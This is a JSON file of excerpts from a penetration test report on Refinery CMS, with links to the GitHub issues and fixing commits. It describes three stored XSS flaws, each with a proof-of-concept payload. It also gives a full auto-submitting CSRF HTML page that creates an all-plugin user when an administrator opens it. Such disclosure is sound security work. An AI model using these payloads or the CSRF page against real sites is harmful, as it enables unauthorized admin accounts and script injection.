{
  "PT-RCMS-001": "PT-RCMS-001: Stored XSS in the Title Text in the image upload\n(Medium)\nIt seems that the display engine i.e. WYSIWYG used in the refinery CMS is not properly sanitizing the\nhtml entities before displaying them on the page.\nThis issue is addressed in the Github.\nhttps://github.com/refinery/refinerycms/issues/3097\nThe Commit link which fixed the issue.\nhttps://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4\nThe steps to produce the vulnerability are\n1. Log in the refinery CMS.\n2. Go to image tabs.\n3. Click on Add new image.\n4. Select an image to upload.\n5. In the Title box insert the XSS payload.\n6. Write anything in the ALT box.\n7. Click on save button.\n8. Move mouse pointer over the info icon found below the uploaded image.\n9. We can see that the XSS payload gets executed.\nThe XSS payload used \u2018<marquee onscroll=confirm(1)>XSS\u2019\n5 | P a g e\nThe below image shows the vulnerable fields.\nThese images shows the payload and the XSS in action.\n6 | P a g e\nThe XSS payload being executed.\n7 | P a g e\n",
  "PT-RCMS-002": "PT-RCMS-002: Stored XSS in the ALT Text in the image upload\n(Medium)\nThis vulnerability is same as PT-RCMS-001 but in a different location.\nThis issue is addressed in the Github\nhttps://github.com/refinery/refinerycms/issues/3097\nThe Commit link which fixed the issue.\nhttps://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4\nThe steps to produce the vulnerability are\n1. Log in the refinery CMS.\n2. Go to image tabs.\n3. Click on Add new image.\n4. Select an image to upload.\n5. Write anything in the title box.\n6. In the ALT box insert the XSS payload.\n7. Click on save button.\n8. Move mouse pointer over the info icon found below the uploaded image.\n9. We can see that the XSS payload gets executed.\nThe XSS payload used \u2018<marquee onscroll=confirm(2)>XSS\u2019\nThe below image shows the payload.\n8 | P a g e\nThe below image shows the execution of XSS payload\n9 | P a g e\n",
  "PT-RCMS-003": "PT-RCMS-003: Stored XSS in the Title of the ADD NEW PAGE\n(Medium)\nThis issue is addressed in the Github.\nhttps://github.com/refinery/refinerycms/issues/3097\nThe steps to produce the vulnerability are\n1. Log in the refinery CMS.\n2. Go to pages tabs.\n3. Click on Add new page.\n4. Insert the XSS payload in the title box.\n5. Write anything in the body.\n6. Click on save button.\n7. Open the saved pages in the new browser window and we can see that the XSS payload gets\nexecuted.\nThe XSS payload used <img src=x onerror=confirm(2)/>\nThe XSS vulnerable field is shown in below image.\nThe below image shows the payload.\n10 | P a g e\nThe Below image shows the payload in action.\n11 | P a g e\n",
  "PT-RCMS-004": "PT-RCMS-004: Cross site request forgery on multiple events.\nDuring testing I found that the anti CSRF token used in the form field is not verified properly to\nprocess the forms. The Forms are processed even though the authenticity_token is left blank this\nresulted in the CSRF vulnerability.\nThis issue was addressed in Github.\nhttps://github.com/refinery/refinerycms/issues/3098\nThis is the link to the commit which fixed the issues.\nhttps://github.com/refinery/refinerycms/commit/9fd5a8b5e98827431add4a4c997286f10092cb9c\nThe Proof of Concept PoC.html is\n<html>\n<!-- CSRF PoC - Add New account -->\n<body>\n<form name=\"csrf\" id=\"csrf\" action=\"http://localhost:3000/refinery/users\" method=\"PATCH\">\n<!-- change the action value according to the server-->\n<input type=\"hidden\" name=\"utf8\" value=\"\u00e2&#156;&#147;\" />\n<input type=\"hidden\" name=\"authenticity&#95;token\" value=\"\" />\n<input type=\"hidden\" name=\"user&#91;username&#93;\" value=\"csrf\" />\n<input type=\"hidden\" name=\"user&#91;full&#95;name&#93;\" value=\"csrf\" />\n<input type=\"hidden\" name=\"user&#91;email&#93;\" value=\"csrf&#64;csrf&#46;com\" />\n<input type=\"hidden\" name=\"user&#91;password&#93;\" value=\"csrf\" />\n<input type=\"hidden\" name=\"user&#91;password&#95;confirmation&#93;\" value=\"csrf\" />\n<input type=\"hidden\" name=\"user&#91;plugins&#93;&#91;&#93;\" value=\"refinery&#95;files\"\n/>\n<input type=\"hidden\" name=\"user&#91;plugins&#93;&#91;&#93;\"\nvalue=\"refinery&#95;images\" />\n<input type=\"hidden\" name=\"user&#91;plugins&#93;&#91;&#93;\"\nvalue=\"refinery&#95;pages\" />\n<input type=\"hidden\" name=\"user&#91;plugins&#93;&#91;&#93;\"\nvalue=\"refinery&#95;authentication&#95;devise\" />\n<input type=\"submit\" value=\"Submit form\" />\n</form>\n<script>document.getElementById(\"csrf\").submit();</script>\n</body>\n</html>\nWhen a Logged in Administrator opens the PoC.html a new user (CSRF) is created with permission to\naccess all plugins.\nThis exploit can be used by least privilege users to elevate to the administrator level or for deletion\nof an existing user, creation of new user with full permissions to access all the plugins.\n12 | "
}